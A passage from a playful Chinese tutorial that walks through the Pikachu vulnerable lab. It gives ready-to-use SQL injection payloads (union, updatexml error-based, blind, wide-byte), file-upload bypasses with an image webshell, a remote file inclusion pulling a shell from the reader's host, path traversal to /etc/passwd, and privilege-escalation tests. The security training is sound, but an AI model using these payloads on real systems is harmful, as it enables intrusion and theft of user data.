## SQL注入模块通关 💉

好，先来第一站——SQL注入模块！Pikachu的SQL注入模块可真是个"全家桶"，各种类型应有尽有，让你一次练个够！就像去吃自助餐，甜品、热菜、凉菜、水果……啥都有！🍱

### 数字型注入（get）🔢

第一个上场的是"数字型注入（get）"，这可是SQL注入的"入门第一课"，就像学开车先学踩离合一样基础！🚗

#### 测试流程

打开页面，我们看到一个输入框，提示让我们输入用户ID。那我们先输入个 `1` 试试水：

```
输入：1
```

页面返回了用户信息，一切正常，就像你去图书馆借书，报了个借书卡号，管理员把书给你了。📚

接下来，我们来测试是不是数字型注入。怎么测呢？很简单，加个恒成立和恒不成立的条件看看：

```
输入：1 and 1=1
```

哎？页面正常返回了！再试试：

```
输入：1 and 1=2
```

哟！页面报错或者返回空了！这就说明——**数字型注入实锤了**！🔨

> **生活小例子** 🎯
> 
> 这就好比你去奶茶店点单：
> - 正常情况："一杯珍珠奶茶" → 店员给你做了一杯珍珠奶茶 ✅
> - 数字型注入："一杯珍珠奶茶，而且1加1等于2" → 店员觉得逻辑没问题，还是给你做了 ✅
> - 数字型注入："一杯珍珠奶茶，而且1加1等于3" → 店员觉得逻辑有问题，不给你做了 ❌
> 
> 为什么会这样？因为数字型的参数是直接拼接到SQL语句里的，就像这样：
> ```sql
> SELECT * FROM users WHERE id = 1 and 1=2
> ```
> 数据库一看，1=2是假的，所以啥都查不出来！

#### 联合查询注入

既然确认是数字型注入，那接下来就是我们的"老套路"了——联合查询注入！三步走：爆库、爆表、爆数据！

**第一步：判断字段数**

```
输入：1 order by 2
```

正常，再试：

```
输入：1 order by 3
```

报错了！说明有 **2个字段**。就像你去餐厅吃饭，桌子上有2套餐具，你硬要摆3套，服务员就该说你了！🍽️

**第二步：判断显示位**

```
输入：-1 union select 1,2
```

看到页面上显示了1和2，说明两个字段都能显示内容！

**第三步：爆库名**

```
输入：-1 union select database(),version()
```

搞定！数据库名和版本号都出来了~

**第四步：爆表名**

```
输入：-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()
```

**第五步：爆字段名**

```
输入：-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users'
```

**第六步：爆数据**

```
输入：-1 union select username,password from users
```

完美！一套连招下来，数据全部带走！是不是觉得很熟悉？没错，这就是我们的"标准操作流程"，就像肯德基的套餐，顺序都给你安排好了！🍔

### 字符型注入（get）📝

好，接下来是"字符型注入（get）"。这个跟数字型的区别在哪呢？简单说——**字符型需要用引号闭合**！

#### 测试流程

还是老规矩，先输入 `1` 试试：

```
输入：1
```

正常返回。那我们加个单引号试试：

```
输入：1'
```

页面报错了！这说明什么？说明参数是用单引号括起来的！就像你去寄快递，你的名字被写在引号里，你得先把引号"打破"才能搞事情！📦

> **生活小例子** 🎯
> 
> 数字型就像：`找 1 号同学`
> 字符型就像：`找叫 '1' 的同学`
> 
> 如果你输入 `1' and '1'='1`，就变成了：
> `找叫 '1' and '1'='1' 的同学`
> 哎，语法没问题，还永远成立！

#### 注入思路

知道了闭合方式，后面就简单了！还是联合查询那一套，只不过需要用单引号闭合：

```
输入：-1' union select 1,2#
```

看到没？这里我们用了 `'` 来闭合前面的单引号，然后用 `#` 把后面的都注释掉。就像你插队买奶茶，先把前面人的订单"截断"，然后点自己的，最后把后面人的都"忽略"掉！😏

后面的爆库爆表爆数据，跟数字型一模一样，我就不啰嗦了~大家自己动手练一练！

### 搜索型注入 🔍

第三个是"搜索型注入"。这个场景就更常见了——**搜索框**！你去淘宝搜商品，去百度搜东西，本质上都是搜索型查询。

#### 什么是搜索型注入？

搜索功能一般用的是 `LIKE` 语句，大概长这样：

```sql
SELECT * FROM goods WHERE name LIKE '%关键词%'
```

看到没？前后都有 `%`，还有单引号。所以我们的注入要考虑怎么闭合这些东西。

#### 测试流程

我们先输入个正常的关键词试试，比如输入 `a`：

```
输入：a
```

返回了所有名字里带a的用户，正常。

那我们来试试注入：

```
输入：a%' and 1=1#
```

哎？正常返回了！再试试：

```
输入：a%' and 1=2#
```

返回空了！成了！搜索型注入get！✅

> **原理揭秘** 🔬
> 
> 我们输入 `a%' and 1=1#` 后，SQL语句变成了：
> ```sql
> SELECT * FROM users WHERE name LIKE '%a%' and 1=1#%'
> ```
> 
> 解释一下：
> - `a%` 先把前面的 `%'` 给"用掉"一部分
> - 然后 `'` 闭合了前面的单引号
> - 接着 `and 1=1` 是我们注入的条件
> - 最后 `#` 把后面的 `%'` 都注释掉了
> 
> 就像拆快递，你得把包装一层一层拆开，才能拿到里面的东西！📦

#### 注入思路

确认了注入点，后面还是老规矩——联合查询搞起来！

```
输入：a%' union select 1,2#
```

然后就是爆库、爆表、爆数据……一套连招带走！

### xx型注入 ❓

接下来这个有意思了——"xx型注入"。为啥叫xx型呢？因为它的闭合方式不确定，需要你自己去测！就像开盲盒，你不知道里面是什么，得拆开才知道！🎁

#### 常见的闭合方式

我给大家列几种常见的，大家可以挨个试：

| 闭合方式 | 测试语句 |
|---------|---------|
| 单引号 | `1' and 1=1#` |
| 双引号 | `1" and 1=1#` |
| 单引号+括号 | `1') and 1=1#` |
| 双引号+括号 | `1") and 1=1#` |
| 两个括号+单引号 | `1')) and 1=1#` |

就像试密码锁，一个一个试，总有一个能打开！🔐

#### 测试思路

这种题的思路就是——**fuzz（模糊测试）**！把各种可能的闭合方式都试一遍，看哪个能成。

给大家一个小技巧：先输入单引号 `'`，看报错信息，从报错里有时候能看出点端倪！比如报错里看到 `')`，那大概率就是单引号加括号闭合了~

> **生活小例子** 🎯
> 
> 这就像你去朋友家，朋友家的门锁很奇怪，可能是钥匙开，可能是密码开，也可能是指纹开。你得一个个试，才能找到开门的方法。
> 
> 当然，现实中可不能随便试别人家的门啊！那是违法的！🚓

### insert注入 📝

好，接下来这个就有点意思了——**insert注入**！以前我们注入的都是SELECT语句，都是"查数据"的。那insert是"插入数据"的，怎么注入呢？

#### 什么是insert注入？

insert注入一般出现在**注册页面**。你注册一个账号，后台执行的是INSERT语句，大概长这样：

```sql
INSERT INTO users (username, password) VALUES ('admin', '123456')
```

那这种情况怎么注入呢？联合查询？不太好用，因为INSERT没有回显啊！你插进去就插进去了，页面不会给你显示数据。

那怎么办？——**报错注入**！💥

#### 报错注入（updatexml）

还记得我们之前学的报错注入吗？`updatexml` 函数！对，就是它！虽然INSERT没有回显，但如果有错误信息，我们就能用报错注入把数据"挤"出来！

就像你挤牙膏，虽然牙膏口很小，但你用力挤，总能挤出来一点！牙膏都能挤，数据当然也能"挤"出来！😆

#### 演示一下

我们打开注册页面，假设用户名那里可以注入。我们在用户名那里输入：

```
用户名：' and updatexml(1,concat(0x7e,database(),0x7e),1) and '
密码：随便输
```

然后点击注册，看看会不会报错？

如果报错信息里出现了数据库名，那就成了！

> **原理揭秘** 🔬
> 
> 我们的payload插入后，SQL语句变成了：
> ```sql
> INSERT INTO users (username, password) VALUES ('' and updatexml(1,concat(0x7e,database(),0x7e),1) and '', '123456')
> ```
> 
> 解释一下：
> - 开头的 `'` 闭合了前面的单引号
> - 然后是我们的报错函数 `updatexml(...)`
> - 最后的 `and '` 是为了闭合后面的单引号，让语法正确
> 
> 就像串珠子，你得把前后都接上，不然珠子就散了！📿

#### 继续注入

既然能爆库名，那爆表、爆字段、爆数据都是一个套路了：

**爆表名：**
```
' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) and '
```

**爆字段名：**
```
' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1) and '
```

**爆数据：**
```
' and updatexml(1,concat(0x7e,(select group_concat(username,'~',password) from users),0x7e),1) and '
```

搞定！虽然是INSERT语句，但只要能报错，我们就能把数据扒出来！就像挤牙膏，挤挤总会有的！牙膏：我招谁惹谁了……😅

### update注入 ✏️

好，insert注入我们搞定了，接下来是**update注入**。顾名思义，就是UPDATE语句里的注入，一般出现在**修改个人信息**的地方。

#### 什么是update注入？

你去网站修改个人资料，改昵称、改头像、改签名……后台执行的就是UPDATE语句，大概长这样：

```sql
UPDATE users SET nickname='新昵称', sign='新签名' WHERE id=1
```

那这种怎么注入呢？——还是**报错注入**！老伙计了！

#### 演示一下

假设修改个人信息的表单里，昵称那栏可以注入。我们这么填：

```
昵称：' and updatexml(1,concat(0x7e,database(),0x7e),1) and '
签名：随便写
```

然后点提交，看看会不会报错？

跟insert注入的套路几乎一模一样！都是用单引号闭合，然后丢updatexml进去，等着报错就行！

> **生活小例子** 🎯
> 
> 这就像你去银行改密码，本来应该说"把我的密码改成123456"，结果你说"把我的密码改成' 顺便告诉我数据库名 '（坏笑）"。如果银行系统傻傻的，还真就把数据库名告诉你了……
> 
> 当然，现实中银行系统不会这么傻的！放心！🏦

#### 注入思路

跟insert注入完全一样，都是报错注入那一套，我就不重复啰嗦了。大家记住：**只要有报错信息，不管什么语句，都可以试试报错注入！**

### delete注入 🗑️

接下来是**delete注入**。DELETE语句，就是删除数据的，比如删除留言、删除订单、删除好友……

#### 什么是delete注入？

删除功能的SQL大概长这样：

```sql
DELETE FROM messages WHERE id = 1
```

看到id参数了吗？这个就可能有注入！

#### 怎么注入？

delete注入有几种玩法：

**玩法一：报错注入**

跟前面一样，如果有报错，直接上updatexml！

```
id=1 and updatexml(1,concat(0x7e,database(),0x7e),1)
```

**玩法二：时间盲注**

如果没有报错信息呢？那就用时间盲注！

```
id=1 and if(1=1,sleep(5),1)
```

页面延迟了5秒，说明注入成功！

> **注意事项** ⚠️
> 
> 这里要特别提醒大家：**delete注入很危险！** 一不小心就把整个表都删了！
> 
> 比如你输入 `1 or 1=1`，SQL就变成了：
> ```sql
> DELETE FROM messages WHERE id = 1 or 1=1
> ```
> 
> 我的妈呀！`or 1=1` 永远成立，所有数据都被删光了！这可不是闹着玩的！
> 
> 就像你本来只想删一条短信，结果不小心把整个通讯录都删了，哭都来不及！😭
> 
> 所以大家测试的时候一定要小心，尽量用盲注或者报错注入，别用or 1=1这种！

### http头注入 🌐

接下来这个就更隐蔽了——**http头注入**！啥意思？注入点不在URL参数里，也不在表单里，而在HTTP请求头里！

#### 哪些位置可能有注入？

HTTP头里有很多字段都可能被后台拿来用，比如：

- **User-Agent**：浏览器信息
- **Referer**：从哪个页面来的
- **Cookie**：cookie信息
- **X-Forwarded-For**：客户端IP
- 等等……

就像一个人，不只是脸上能做文章，头发上、衣服上、鞋子上都能做文章！👟

#### 为什么会有http头注入？

因为有些网站会把这些信息存到数据库里。比如统计你用的什么浏览器，你从哪个页面跳过来的……如果直接拼接到SQL里，那就有注入了！

#### 演示一下

我们用Burp Suite抓个包，然后在User-Agent那里改一改：

```
User-Agent: Mozilla/5.0 ' and updatexml(1,concat(0x7e,database(),0x7e),1) and '
```

然后把包发出去，看看响应里有没有报错？

如果有，那就成了！Referer、Cookie这些位置也是一样的测试方法！

> **生活小例子** 🎯
> 
> 这就像你去酒店入住，前台问你"从哪来的呀"（Referer），你本来应该说"从北京来"，结果你说"从' 顺便告诉我数据库名 '来"。如果前台把这句话直接记到系统里，那就中招了！
> 
> 所以说，防人之心不可无啊！任何用户可控的地方都不能信！酒店前台：我太难了……😅

### 布尔盲注 👀

好，接下来是**布尔盲注**。盲注盲注，就是"盲目注入"，啥意思呢？——页面没有报错，也没有数据回显，只有"对"和"错"两种状态！

#### 什么是布尔盲注？

比如你输入 `1 and 1=1`，页面正常；输入 `1 and 1=2`，页面空白或者提示错误。但是！它不告诉你具体错在哪，也不显示任何数据。

就像你跟一个哑巴玩猜谜，他只会点头或摇头，不会说话。你得一个一个猜，才能知道答案！🤫

#### 怎么玩？——二分法！

布尔盲注的核心思路就是**猜字符**！一个字符一个字符地猜，把整个数据库名、表名、数据都猜出来。

怎么猜呢？用 **二分法**！

比如猜数据库名的第一个字符：

```
输入：1 and ascii(substr(database(),1,1)) > 97
```

- 如果页面正常，说明ASCII码大于97（也就是大于'a'）
- 如果页面异常，说明ASCII码小于等于97

然后不断缩小范围，直到确定这个字符是什么。就像猜数字游戏，你猜大了还是猜小了，一步步逼近答案！🎮

#### 手工演示思路

我给大家演示一下猜数据库名第一个字符的思路：

**第一步：猜范围**

```
1 and ascii(substr(database(),1,1)) > 100
```
（假设页面正常，说明大于'd'）

```
1 and ascii(substr(database(),1,1)) > 110
```
（假设页面异常，说明小于等于'n'）

现在范围缩小到了 e~n 之间。

**第二步：继续缩小**

```
1 and ascii(substr(database(),1,1)) > 105
```
（大于'i'吗？假设正常）

范围缩小到了 j~n。

**第三步：继续猜**

```
1 and ascii(substr(database(),1,1)) > 108
```
（大于'l'吗？假设异常）

范围缩小到了 j~l。

**第四步：确定字符**

```
1 and ascii(substr(database(),1,1)) = 107
```
（等于'k'吗？假设正常）

搞定！第一个字符是 'k'！🎉

然后第二个字符、第三个字符……一直猜下去。当然，手工猜太费劲了，一般都是用sqlmap或者自己写脚本。但是思路你得懂！

> **生活小例子** 🎯
> 
> 这就像你去相亲，媒婆不告诉你对方叫啥，只让你猜：
> - "她姓张吗？" → 媒婆摇头 ❌
> - "她姓李吗？" → 媒婆点头 ✅
> - "她叫李小花吗？" → 媒婆摇头 ❌
> - "她叫李小美吗？" → 媒婆点头 ✅
> 
> 就这样一个一个猜，最后总能猜出来。当然，现实中相亲可不会这么玩，那也太费劲了！😂

### 时间盲注 ⏰

比布尔盲注更狠的来了——**时间盲注**！布尔盲注好歹还有个"对和错"的区别，时间盲注更绝——**无论对错，页面都一模一样！**

#### 什么是时间盲注？

你输入 `1 and 1=1`，页面是这样；你输入 `1 and 1=2`，页面还是这样。完全看不出区别！就像对方是个面瘫，你说啥他都一个表情，你根本不知道他听没听懂！😐

那怎么办呢？——用 **sleep()函数**！

#### 思路讲解

虽然页面看不出区别，但我们可以让数据库"睡觉"，通过响应时间来判断！

```
输入：1 and if(1=1,sleep(5),1)
```

如果页面过了5秒才加载出来，说明条件成立（1=1是真的），数据库执行了sleep(5)。

```
输入：1 and if(1=2,sleep(5),1)
```

如果页面秒开，说明条件不成立（1=2是假的），数据库没睡觉。

就像你跟一个人说话，他虽然面无表情，但你问他"你要是听懂了就等5秒再回复"，他真的等了5秒才回复你——说明他听懂了！🤯

#### 注入思路

时间盲注的思路跟布尔盲注差不多，都是一个字符一个字符猜。只不过判断条件从"页面是否正常"变成了"页面是否延迟"。

比如猜数据库名第一个字符：

```
1 and if(ascii(substr(database(),1,1))>97,sleep(5),1)
```

- 如果延迟5秒，说明大于'a'
- 如果秒开，说明小于等于'a'

然后还是二分法那一套，慢慢猜~

> **生活小例子** 🎯
> 
> 这就像你跟一个异国友人聊天，语言不通怎么办？你可以说：
> - "你要是听懂了，就5秒后点点头"
> - 他5秒后点头了 → 听懂了 ✅
> - 他立刻摇头了 → 没听懂 ❌
> 
> 虽然语言不通，但通过"时间差"，你们还是能交流！是不是很神奇？🌍

### 宽字节注入 🌏

最后一个SQL注入类型——**宽字节注入**！这个我们之前也讲过，对吧？老朋友了~

#### 什么是宽字节注入？

有些网站会用 `addslashes()` 函数把单引号、双引号这些特殊字符转义，就是给它们前面加个反斜杠 `\`。这样你输入 `'` 就变成了 `\'`，单引号就失效了。

但是！如果数据库用的是GBK编码，就可以用 **%df'** 绕过！

#### 原理回顾

原理其实很简单：

- 你输入 `%df'`
- addslashes会把 `'` 转义成 `\'`，也就是 `%df%5c%27`
- 但是GBK编码里，`%df%5c` 是一个汉字（"運"）
- 所以单引号 `%27` 就"逃脱"了！

就像你逃跑的时候，前面有个守卫（反斜杠），你拉了个路人（%df）跟守卫站一起，他俩凑成一对儿了，你就趁机跑了！🏃‍♂️

#### 演示一下

```
输入：-1%df' union select 1,2#
```

看看能不能成功？如果可以，那就是宽字节注入了！

后面的爆库爆表爆数据，跟普通注入一样，就是每个单引号前面都加个 `%df` 就行~

## 文件上传模块通关 📤

好，SQL注入我们就先聊到这，接下来是**文件上传模块**！这个我们也熟得很，Upload-Labs都通关了，Pikachu还不是小菜一碟？😏

但是！Pikachu的文件上传也有它的特点，我们来看看~

### 前端检查 🖱️

第一个是前端检查。啥意思？就是用JavaScript在前端验证文件后缀，后端根本不检查！

#### 怎么绕过？

太简单了——**抓包改**！

1. 先把你的shell改个后缀，比如 `shell.jpg`
2. 上传，用Burp抓包
3. 把文件名改回 `shell.php`
4. 放包

搞定！前端检查就是"纸老虎"，看起来很凶，一戳就破！🐯

> **生活小例子** 🎯
> 
> 这就像小区门口的保安，只看你门禁卡长啥样，不验真假。你拿张画着门禁卡的纸都能进去……
> 
> 当然，现实中的保安不会这么傻啦！只是打个比方~👮

---

### MIME检查 📋

第二个是MIME类型检查。MIME是啥？就是HTTP请求里的 `Content-Type` 字段，比如 `image/jpeg` 表示图片，`text/html` 表示网页。

#### 怎么绕过？

还是抓包改！

把请求头里的 `Content-Type` 改成 `image/jpeg` 就行！

```
Content-Type: image/jpeg
```

后端一看，哦，是图片，那上传吧~ 殊不知你传的是个PHP文件！

就像你混进演唱会，保安问你"你是干啥的"，你说"我是修音响的"，保安就放你进去了……也不查查你到底是不是！🎤

---

### getimagesize检查 🖼️

第三个是 `getimagesize` 检查。这个函数会检查文件是不是真的图片，会读取文件头信息。

#### 怎么绕过？

——**图片马**！

做个图片马，把PHP代码藏在图片里：

```
copy 1.jpg /b + shell.php /a shell.jpg
```

这样生成的 `shell.jpg`，前半部分是正常的图片，后半部分是PHP代码。getimagesize一检查，哎，是图片，通过！

但是！光有图片马还不够，得配合**文件包含**或者**解析漏洞**才能用。不然图片就是图片，不会被当成PHP执行的~

> **生活小例子** 🎯
> 
> 这就像你把小纸条藏在书里，安检的时候只翻了翻封面，一看是本书，就让你带进去了。殊不知书里藏着小纸条呢！📖

---

### 综合 🎯

第四个是"综合"类型。啥意思？就是前面几种检查都有——前端检查、MIME检查、文件头检查，全给你安排上了！

#### 怎么绕过？

那就要组合拳了：

1. 前端绕过：抓包改后缀
2. MIME绕过：改Content-Type
3. getimagesize绕过：用图片马

三个一起上，就不信绕不过去！💪

但是还是那句话，图片马需要配合文件包含或者解析漏洞才能用。Pikachu里有文件包含模块，所以我们可以传完图片马，再用文件包含去包含它，就能getshell了！

```
http://xxx/vul/fileinclude/fi_local.php?filename=../../upload/shell.jpg
```

完美！图片马+文件包含，黄金搭档！🤝

## 文件包含模块 📂

好，接下来是文件包含模块。这个我们在DVWA也学过了，对吧？本地文件包含、远程文件包含、PHP伪协议……都是老朋友了！

既然是老朋友，我们就简单带过，复习一下~

### 本地文件包含（LFI）🏠

本地文件包含，就是包含服务器上的文件。比如：

```
http://xxx/vul/fileinclude/fi_local.php?filename=../../../../etc/passwd
```

用 `../` 往上跳目录，可以读到任意文件！就像你去别人家做客，不看主人给你的书，非要去翻人家的保险柜……😏

### 远程文件包含（RFI）🌐

远程文件包含，就是可以包含远程服务器上的文件。比如：

```
http://xxx/vul/fileinclude/fi_remote.php?filename=http://你的ip/shell.txt
```

直接把你的shell传过去执行，爽歪歪！但是这个需要php.ini里开了 `allow_url_include`，现在默认都是关的，所以比较少见。

### PHP伪协议的使用 📜

PHP伪协议可是个好东西，我们来复习几个常用的：

| 协议 | 作用 | 例子 |
|-----|------|------|
| php://filter | 读取PHP源码 | `php://filter/read=convert.base64-encode/resource=index.php` |
| php://input | 执行PHP代码 | `php://input` （POST数据里写代码） |
| data:// | 执行PHP代码 | `data://text/plain,<?php phpinfo();?>` |
| file:// | 读取本地文件 | `file:///etc/passwd` |

就像工具箱里的各种螺丝刀，不同的场景用不同的工具，总有一个适合你！🔧

## 不安全的文件下载 📥

好，接下来是一个新面孔——**不安全的文件下载**！这个漏洞也很常见，而且危害不小。

### 什么是不安全的文件下载？🤔

顾名思义，就是下载文件的功能不安全。怎么不安全呢？——**下载文件的路径是用户可控的！**

比如一个下载链接长这样：

```
http://xxx/download.php?file=report.pdf
```

你把 `file` 参数改成别的，比如：

```
http://xxx/download.php?file=../../../../etc/passwd
```

如果网站直接把这个文件返回给你了，那就是不安全的文件下载！

> **生活小例子** 🎯
> 
> 这就像你去图书馆借书，图书管理员问你"借哪本书"，你说"借《三国演义》"，管理员就给你拿《三国演义》。
> 
> 但是如果你说"借 ../../../银行金库密码本"，管理员要是真去给你拿了……那这个管理员也太好说话了吧！🏦
> 
> 不安全的文件下载就是这样，你要啥它给啥，完全不检查你要的东西是不是在允许的范围内！

### 原理和危害 ⚠️

原理很简单：后台直接把用户传的文件名拼接到文件路径上，然后读取文件返回给用户，完全没做限制。

危害有多大呢？——**可以下载服务器上的任意文件！**

比如：
- 下载配置文件，拿到数据库账号密码
- 下载源码，进行代码审计找更多漏洞
- 下载 `/etc/passwd`，看有哪些用户
- 下载网站的备份文件
- 等等……

就像你去别人家，人家直接把所有抽屉都给你打开，让你随便翻……想想都可怕！😱

### 怎么测试？🧪

测试方法也很简单：

1. 找到下载链接，看看有没有 `file`、`filename`、`path` 之类的参数
2. 修改参数，试试 `../` 跳目录
3. 看看能不能下载到系统文件（比如Windows的 `C:\Windows\System32\drivers\etc\hosts`，Linux的 `/etc/passwd`）
4. 如果能，那就存在漏洞！

给大家几个常见的测试payload：

**Windows系统：**
```
..\..\..\..\Windows\System32\drivers\etc\hosts
```

**Linux系统：**
```
../../../../etc/passwd
```

就像试钥匙，拿几个常用的试试，说不定就打开了！🔑

## 越权访问（重点！）🔑

好，接下来是本章的**重中之重**——**越权访问**！这个漏洞超级常见，而且超级危险，大家一定要好好听！

### 什么是越权？🤔

越权越权，就是"超越权限"。简单说就是——**你干了你不该干的事，看了你不该看的东西！**

越权主要分两种：

#### 水平越权 ↔️

**水平越权**：同一级别的用户，A能看B的数据。

比如你和张三都是普通用户，你只能看你自己的订单，但是你居然能看到张三的订单——这就是水平越权。

就像你和同事都是普通员工，你居然能翻开同事的工资条看……这就不太合适了！💰

#### 垂直越权 ⬆️

**垂直越权**：低级别用户能干高级别用户的事。

比如你是普通用户，但是你居然能访问管理员后台，还能删用户、改权限——这就是垂直越权。

就像你是公司实习生，结果你居然能进老板办公室，还能随便签合同……那不乱套了！👔

> **生活小例子** 🎯
> 
> 给大家打个更形象的比方：
> 
> - **水平越权**：你住301，邻居住302。你居然能打开302的门，进去随便翻东西。你们都是住户（同级别），但你进了别人家的门。🏠
> 
> - **垂直越权**：你是房客，结果你居然能进物业经理办公室，还能随便给其他房客停水停电。你是房客（低级别），却干了物业经理（高级别）才能干的事。🏢
> 
> 这下明白了吧？越权漏洞就是"权限控制没做好"，该拦的没拦住！

---

### 水平越权演示 🎬

光说不练假把式，我们来看看Pikachu里的水平越权怎么玩。

#### 第一步：登录用户A

先登录第一个用户，比如用户 `vince`（密码自己看提示，一般都是123456之类的）。

登录进去后，点"查看个人信息"，看到了vince的个人信息。

注意看URL，大概长这样：

```
http://xxx/vul/overpermission/op1/op1_user.php?id=1
```

看到那个 `id=1` 了吗？这就是用户ID！

#### 第二步：改成用户B的ID

好，现在我们把URL里的 `id=1` 改成 `id=2`：

```
http://xxx/vul/overpermission/op1/op1_user.php?id=2
```

回车！

哎？页面上显示的是另一个用户（比如allen）的个人信息！😱

我们明明登录的是vince，却看到了allen的信息——这就是**水平越权**！

#### 为什么会这样？

因为后台只检查了"你有没有登录"，但是没检查"这个ID是不是你的"。就像小区门口的保安，只看你有没有门禁卡，不看门禁卡上的名字是不是你，你拿着别人的门禁卡也能进。

听起来很离谱对不对？但现实中这种漏洞真的超级多！很多开发者都只想着"用户登录了就行"，忘了检查"用户有没有权限访问这个资源"。

> **敲黑板** 📢
> 
> 水平越权的测试方法就是：
> 1. 登录A用户，找到一个能看A信息的页面，注意URL里的id参数
> 2. 把id改成B用户的id
> 3. 如果能看到B的信息，就是水平越权！
> 
> 就这么简单！但是很多网站都有这个问题，大家平时挖漏洞可以多关注关注~

---

### 垂直越权演示 🎬

看完水平越权，我们再来看**垂直越权**。

#### 第一步：看看管理员页面

先看看管理员后台的URL是什么，比如：

```
http://xxx/vul/overpermission/op2/op2_admin.php
```

#### 第二步：用普通用户访问

现在我们登录一个普通用户（不是管理员），然后直接在地址栏输入管理员页面的URL，回车！

如果能直接进入管理员后台，甚至能操作管理员功能——那就是**垂直越权**！

#### 为什么会这样？

因为后台只在前端做了限制（比如普通用户看不到管理员菜单），但是后端没做权限校验。你直接输URL就能进。

就像公司的办公室，门上写着"经理办公室，闲人免进"，但是门没锁……你一推就进去了！🚪

> **生活小例子** 🎯
> 
> 再打个比方：
> 
> 你去游乐园，买了普通票，只能玩普通项目。VIP项目门口站了个工作人员，但是工作人员只会看你"有没有票"，不看你"是不是VIP票"。
> 
> 结果你拿着普通票大摇大摆地就进了VIP项目区……这就是垂直越权！🎢
> 
> 是不是觉得很离谱？但很多网站真的就是这样！前端藏了按钮，就以为用户访问不到了——太天真了！

---

### 越权漏洞很常见，也很危险 ⚠️

最后再强调一遍：**越权漏洞非常常见，也非常危险！**

为什么常见？因为很多开发者都有一个误区："用户登录了就安全了"。大错特错！登录只能证明"你是谁"，不能证明"你有权限做这件事"。

打个比方：你住酒店，房卡只能开你自己房间的门。如果一张房卡能开所有房间的门，那还了得？🏨

越权漏洞的危害也很大：
- 水平越权：可以泄露所有用户的隐私信息
- 垂直越权：可以直接拿到管理员权限，控制整个网站

所以大家做渗透测试的时候，一定要记得测越权！这个可是挖洞的"金矿"，一挖一个准！💰
